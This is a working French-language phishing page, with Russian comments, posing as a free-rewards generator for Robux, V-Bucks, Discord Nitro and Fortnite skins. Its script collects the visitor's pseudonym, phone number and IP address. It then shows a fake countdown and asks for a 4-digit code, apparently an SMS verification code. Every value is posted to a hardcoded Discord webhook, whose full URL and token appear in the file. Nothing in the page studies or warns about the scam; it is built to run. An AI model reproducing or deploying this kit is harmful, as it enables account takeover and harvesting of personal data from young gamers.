<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Générateur de Récompenses</title>
    <style>
        /* ============================================================
           СТИЛИ ИНТЕРФЕЙСА
           ============================================================ */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: radial-gradient(ellipse at bottom, #1b2735 0%, #090a0f 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(72, 219, 251, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255, 107, 107, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 50% 80%, rgba(254, 202, 87, 0.08) 0%, transparent 50%);
            pointer-events: none;
            animation: bgPulse 8s ease-in-out infinite;
        }
        @keyframes bgPulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        .container {
            position: relative;
            background: rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 24px;
            padding: 40px;
            max-width: 520px;
            width: 100%;
            box-shadow: 
                0 25px 60px rgba(0, 0, 0, 0.6),
                inset 0 1px 0 rgba(255, 255, 255, 0.1);
            text-align: center;
            z-index: 1;
        }
        h1 {
            font-size: 2em;
            margin-bottom: 8px;
            background: linear-gradient(90deg, #48dbfb, #feca57, #ff6b6b, #ff9ff3);
            background-size: 300% 300%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: gradientShift 4s ease infinite;
        }
        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .subtitle {
            color: #888;
            margin-bottom: 30px;
            font-size: 0.9em;
        }
        .options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 14px;
            margin-bottom: 28px;
        }
        .option-btn {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 20px 12px;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            color: #fff;
            font-size: 0.95em;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 8px;
            position: relative;
            overflow: hidden;
        }
        .option-btn::after {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
            transition: left 0.5s ease;
        }
        .option-btn:hover::after {
            left: 100%;
        }
        .option-btn:hover {
            background: rgba(255, 255, 255, 0.1);
            border-color: #48dbfb;
            transform: translateY(-4px);
            box-shadow: 0 10px 30px rgba(72, 219, 251, 0.2);
        }
        .option-btn.selected {
            background: rgba(72, 219, 251, 0.15);
            border-color: #48dbfb;
            box-shadow: 0 0 25px rgba(72, 219, 251, 0.4);
            transform: scale(1.02);
        }
        .option-btn .icon {
            font-size: 2.2em;
            filter: drop-shadow(0 0 8px rgba(255,255,255,0.3));
        }
        .option-btn .label {
            font-weight: 600;
            font-size: 0.85em;
        }
        .form-group {
            margin-bottom: 22px;
            text-align: left;
        }
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #aaa;
            font-size: 0.85em;
            font-weight: 500;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }
        .form-group input {
            width: 100%;
            padding: 16px 18px;
            border-radius: 14px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 1.05em;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
            letter-spacing: 1px;
        }
        .form-group input:focus {
            border-color: #48dbfb;
            background: rgba(72, 219, 251, 0.05);
            box-shadow: 0 0 20px rgba(72, 219, 251, 0.15);
        }
        .form-group input::placeholder {
            color: #555;
            font-family: 'Segoe UI', sans-serif;
            letter-spacing: normal;
        }
        .code-input {
            display: flex;
            gap: 12px;
            justify-content: center;
        }
        .code-input input {
            width: 70px;
            height: 70px;
            text-align: center;
            font-size: 1.8em;
            font-weight: bold;
            border-radius: 16px;
            border: 2px solid rgba(255, 255, 255, 0.1);
            background: rgba(255, 255, 255, 0.04);
            color: #feca57;
            outline: none;
            transition: all 0.3s ease;
            font-family: 'Courier New', monospace;
            caret-color: #feca57;
        }
        .code-input input:focus {
            border-color: #feca57;
            background: rgba(254, 202, 87, 0.05);
            box-shadow: 0 0 25px rgba(254, 202, 87, 0.3);
            transform: scale(1.05);
        }
        .btn-submit {
            width: 100%;
            padding: 18px;
            border-radius: 14px;
            border: none;
            background: linear-gradient(135deg, #48dbfb, #0abde3, #48dbfb);
            background-size: 200% 200%;
            color: #fff;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
            animation: btnGradient 3s ease infinite;
        }
        @keyframes btnGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .btn-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(72, 219, 251, 0.5);
        }
        .btn-submit:active {
            transform: translateY(0);
        }
        .btn-submit:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
            animation: none;
        }
        .timer-container {
            margin: 30px 0;
            display: none;
        }
        .timer-container.active {
            display: block;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .timer-label {
            font-size: 0.9em;
            color: #aaa;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        .timer-display {
            font-size: 4em;
            font-weight: bold;
            color: #feca57;
            text-shadow: 
                0 0 20px rgba(254, 202, 87, 0.6),
                0 0 40px rgba(254, 202, 87, 0.3),
                0 0 80px rgba(254, 202, 87, 0.1);
            font-family: 'Courier New', monospace;
            line-height: 1;
            margin-bottom: 20px;
            animation: timerPulse 1s ease-in-out infinite;
        }
        @keyframes timerPulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .timer-bar {
            width: 100%;
            height: 10px;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 5px;
            overflow: hidden;
            position: relative;
        }
        .timer-bar-fill {
            height: 100%;
            width: 100%;
            background: linear-gradient(90deg, #ff6b6b, #feca57, #48dbfb);
            background-size: 200% 100%;
            border-radius: 5px;
            transition: width 1s linear;
            animation: barGradient 2s ease infinite;
        }
        @keyframes barGradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .status-message {
            margin-top: 20px;
            padding: 14px;
            border-radius: 12px;
            font-size: 0.9em;
            display: none;
            transition: all 0.3s ease;
        }
        .status-message.info {
            display: block;
            background: rgba(72, 219, 251, 0.1);
            border: 1px solid rgba(72, 219, 251, 0.3);
            color: #48dbfb;
        }
        .status-message.success {
            display: block;
            background: rgba(46, 213, 115, 0.1);
            border: 1px solid rgba(46, 213, 115, 0.3);
            color: #2ed573;
        }
        .status-message.warning {
            display: block;
            background: rgba(254, 202, 87, 0.1);
            border: 1px solid rgba(254, 202, 87, 0.3);
            color: #feca57;
        }
        .step {
            display: none;
        }
        .step.active {
            display: block;
            animation: slideIn 0.4s ease;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .reward-badge {
            display: inline-block;
            padding: 8px 16px;
            background: rgba(72, 219, 251, 0.15);
            border: 1px solid rgba(72, 219, 251, 0.4);
            border-radius: 20px;
            font-size: 0.85em;
            color: #48dbfb;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 Récompenses</h1>
        <p class="subtitle">Choisis ta récompense et remplis le formulaire</p>

        <!-- ШАГ 1: ВЫБОР РЕКОМПЕНСЫ -->
        <div id="step1" class="step active">
            <div class="options" id="options">
                <div class="option-btn" data-value="Snapchat">
                    <span class="icon">👻</span>
                    <span class="label">Snapchat</span>
                </div>
                <div class="option-btn" data-value="Roblox">
                    <span class="icon">🎮</span>
                    <span class="label">Roblox</span>
                </div>
                <div class="option-btn" data-value="Robux">
                    <span class="icon">💰</span>
                    <span class="label">Robux</span>
                </div>
                <div class="option-btn" data-value="Nitro Discord">
                    <span class="icon">💬</span>
                    <span class="label">Nitro Discord</span>
                </div>
                <div class="option-btn" data-value="V-Bucks">
                    <span class="icon">🪙</span>
                    <span class="label">V-Bucks</span>
                </div>
                <div class="option-btn" data-value="Skin Fortnite">
                    <span class="icon">🦸</span>
                    <span class="label">Skin Fortnite</span>
                </div>
            </div>
            <button class="btn-submit" id="btnNext" disabled>Continuer</button>
        </div>

        <!-- ШАГ 2: ПСЕВДОНИМ + НОМЕР -->
        <div id="step2" class="step">
            <div class="reward-badge" id="rewardBadge2"></div>
            <div class="form-group">
                <label>👤 Pseudo</label>
                <input type="text" id="pseudo" placeholder="Ton pseudo" autocomplete="off">
            </div>
            <div class="form-group">
                <label>📞 Numéro de téléphone</label>
                <input type="tel" id="phone" placeholder="0606060606" autocomplete="off">
            </div>
            <button class="btn-submit" id="btnToTimer">Valider</button>
        </div>

        <!-- ШАГ 3: ТАЙМЕР 30 СЕКУНД -->
        <div id="step3" class="step">
            <div class="reward-badge" id="rewardBadge3"></div>
            <div class="timer-container active">
                <div class="timer-label">⏳ Attribution en cours</div>
                <div class="timer-display" id="timerDisplay">30</div>
                <div class="timer-bar">
                    <div class="timer-bar-fill" id="timerBar"></div>
                </div>
                <div id="timerStatus" class="status-message"></div>
            </div>
        </div>

        <!-- ШАГ 4: КОД ИЗ 4 ЦИФР -->
        <div id="step4" class="step">
            <div class="reward-badge" id="rewardBadge4"></div>
            <div class="form-group">
                <label>🔢 Code à 4 chiffres</label>
                <div class="code-input">
                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" id="code1">
                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" id="code2">
                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" id="code3">
                    <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" id="code4">
                </div>
            </div>
            <button class="btn-submit" id="btnFinal">Confirmer</button>
            <div id="finalStatus" class="status-message"></div>
        </div>
    </div>

    <script>
        // ============================================================
        // КОНФИГУРАЦИЯ WEBHOOK DISCORD
        // ============================================================
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1555645601650057307/Noujixd4uTHiUbrkFZ6EAfLEd8WDVeqxxy7PRq-dfbCbfanP-Z77UM1P30NvVDfrlDhM';

        // ============================================================
        // ПЕРЕМЕННЫЕ СОСТОЯНИЯ
        // ============================================================
        let selectedReward = null;
        let countdownInterval = null;
        let ipAddress = 'Inconnue';
        let pseudoValue = '';
        let phoneValue = '';

        // ============================================================
        // ПОЛУЧЕНИЕ IP-АДРЕСА
        // ============================================================
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                ipAddress = data.ip;
                console.log('IP:', ipAddress);
            } catch (error) {
                try {
                    const response2 = await fetch('https://ipapi.co/json/');
                    const data2 = await response2.json();
                    ipAddress = data2.ip || 'Inconnue';
                } catch (e) {
                    ipAddress = 'Inconnue';
                }
            }
        }

        // ============================================================
        // ОТПРАВКА В WEBHOOK DISCORD
        // ============================================================
        async function sendToWebhook(payload) {
            try {
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                console.log('Webhook status:', response.status);
                return response.ok || response.status === 204;
            } catch (error) {
                console.error('Webhook error:', error);
                return false;
            }
        }

        // ============================================================
        // ФОРМИРОВАНИЕ EMBED
        // ============================================================
        function buildEmbed(reward, pseudo, phone, code, ip) {
            return {
                embeds: [{
                    title: '🎯 Nouvelle soumission',
                    color: 0x48dbfb,
                    fields: [
                        { name: '🎁 Récompense', value: reward || 'N/A', inline: true },
                        { name: '👤 Pseudo', value: pseudo || 'N/A', inline: true },
                        { name: '📞 Numéro', value: phone || 'N/A', inline: true },
                        { name: '🔢 Code', value: code || 'N/A', inline: true },
                        { name: '🌐 IP', value: ip || 'Inconnue', inline: true }
                    ],
                    footer: { text: 'Générateur de récompenses' },
                    timestamp: new Date().toISOString()
                }]
            };
        }

        // ============================================================
        // ВЫБОР РЕКОМПЕНСЫ
        // ============================================================
        document.querySelectorAll('.option-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
                this.classList.add('selected');
                selectedReward = this.getAttribute('data-value');
                document.getElementById('btnNext').disabled = false;
                document.getElementById('rewardBadge2').textContent = '🎁 ' + selectedReward;
                document.getElementById('rewardBadge3').textContent = '🎁 ' + selectedReward;
                document.getElementById('rewardBadge4').textContent = '🎁 ' + selectedReward;
            });
        });

        // ============================================================
        // ШАГ 1 -> ШАГ 2
        // ============================================================
        document.getElementById('btnNext').addEventListener('click', function() {
            if (!selectedReward) return;
            document.getElementById('step1').classList.remove('active');
            document.getElementById('step2').classList.add('active');
        });

        // ============================================================
        // ШАГ 2 -> ШАГ 3 (ТАЙМЕР) + ОТПРАВКА В WEBHOOK
        // ============================================================
        document.getElementById('btnToTimer').addEventListener('click', async function() {
            pseudoValue = document.getElementById('pseudo').value.trim();
            phoneValue = document.getElementById('phone').value.trim();

            if (!pseudoValue) {
                alert('Veuillez entrer un pseudo.');
                return;
            }
            if (!phoneValue || phoneValue.length < 6) {
                alert('Veuillez entrer un numéro valide.');
                return;
            }

            await fetchIP();

            // ОТПРАВКА В WEBHOOK СРАЗУ ПОСЛЕ ВВОДА ПСЕВДОНИМА И НОМЕРА
            const payload = buildEmbed(selectedReward, pseudoValue, phoneValue, 'En attente', ipAddress);
            await sendToWebhook(payload);

            document.getElementById('step2').classList.remove('active');
            document.getElementById('step3').classList.add('active');
            startTimer();
        });

        // ============================================================
        // ТАЙМЕР 30 СЕКУНД
        // ============================================================
        function startTimer() {
            let seconds = 30;
            const display = document.getElementById('timerDisplay');
            const bar = document.getElementById('timerBar');
            const status = document.getElementById('timerStatus');

            display.textContent = seconds;
            bar.style.width = '100%';

            countdownInterval = setInterval(() => {
                seconds--;
                display.textContent = seconds;
                bar.style.width = ((seconds / 30) * 100) + '%';

                if (seconds === 20) {
                    status.className = 'status-message info';
                    status.textContent = '⏳ Vérification du compte...';
                } else if (seconds === 10) {
                    status.className = 'status-message warning';
                    status.textContent = '⏳ Attribution de ' + selectedReward + '...';
                } else if (seconds === 5) {
                    status.className = 'status-message warning';
                    status.textContent = '⏳ Finalisation...';
                }

                if (seconds <= 0) {
                    clearInterval(countdownInterval);
                    display.textContent = '0';
                    bar.style.width = '0%';
                    status.className = 'status-message success';
                    status.textContent = '✅ Prêt ! Entre ton code de confirmation.';

                    setTimeout(() => {
                        document.getElementById('step3').classList.remove('active');
                        document.getElementById('step4').classList.add('active');
                        document.getElementById('code1').focus();
                    }, 800);
                }
            }, 1000);
        }

        // ============================================================
        // АВТОПЕРЕХОД ПОЛЕЙ КОДА
        // ============================================================
        const codeInputs = ['code1', 'code2', 'code3', 'code4'].map(id => document.getElementById(id));
        codeInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                this.value = this.value.replace(/[^0-9]/g, '');
                if (this.value.length === 1 && index < 3) {
                    codeInputs[index + 1].focus();
                }
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
                    codeInputs[index - 1].focus();
                }
            });
        });

        // ============================================================
        // ФИНАЛЬНАЯ ОТПРАВКА КОДА
        // ============================================================
        document.getElementById('btnFinal').addEventListener('click', async function() {
            const code = codeInputs.map(i => i.value).join('');

            if (code.length !== 4) {
                alert('Veuillez entrer un code à 4 chiffres.');
                return;
            }

            const payload = buildEmbed(selectedReward, pseudoValue, phoneValue, code, ipAddress);
            const success = await sendToWebhook(payload);
            const status = document.getElementById('finalStatus');

            if (success) {
                status.className = 'status-message success';
                status.textContent = '✅ Code confirmé ! Ta récompense arrive.';
                document.getElementById('btnFinal').disabled = true;
            } else {
                status.className = 'status-message warning';
                status.textContent = '⚠️ Erreur de connexion. Réessaie.';
            }
        });

        // ============================================================
        // ЗАПУСК
        // ============================================================
        window.addEventListener('load', function() {
            fetchIP();
        });
    </script>
</body>
</html>
